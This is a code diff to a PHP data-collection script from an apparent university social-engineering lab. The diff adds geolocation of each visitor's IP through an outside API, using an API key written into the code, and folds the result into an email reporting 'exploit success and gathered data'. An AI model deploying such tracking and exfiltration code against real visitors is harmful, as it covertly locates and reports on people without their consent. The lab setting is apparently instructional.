@@ -105,6 +105,19 @@ if($sendIT == 1){
 	$userAgent = $_SERVER['HTTP_USER_AGENT'];
 	$timeZone = date_default_timezone_get();
 
+	// Geo-locate IP Address
+	$ip_loc_api = "http://api.ipstack.com/" . $clientIPOne . "?access_key=817d284f4b9b8f591d129ae710da5eb9" . "&format=1";
+    $ch = curl_init();
+	
+	// set URL and other appropriate options
+	curl_setopt($ch, CURLOPT_URL, $ip_loc_api);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($ch, CURLOPT_HEADER, 0);
+	
+	$ip_results = curl_exec($ch);
+	// close cURL resource, and free up system resources
+	curl_close($ch);
+	
 	// Send notification of exploit success and gathered data.
 		$email_subject = "Social Engineering Lab Data Report";
 		$headers = "From: no-reply@lab5.rit.edu \r\n";
@@ -115,6 +128,8 @@ if($sendIT == 1){
 		$email_body .= "<h1>Webpage Accessed</h1>";
 		$email_body .= "<h3>Client IP</h3>";
         $email_body .=  $clientIPOne . "<br>";
+		## Added ip results
+		$email_body .= $ip_results . "<br>";
         $email_body .= "<h3>Time of Access</h3>";
         $email_body .=  "Request Time (system): " . $reqTime . "<br>";
         $email_body .=  "Request Time (readable): " . $now . "<br>";
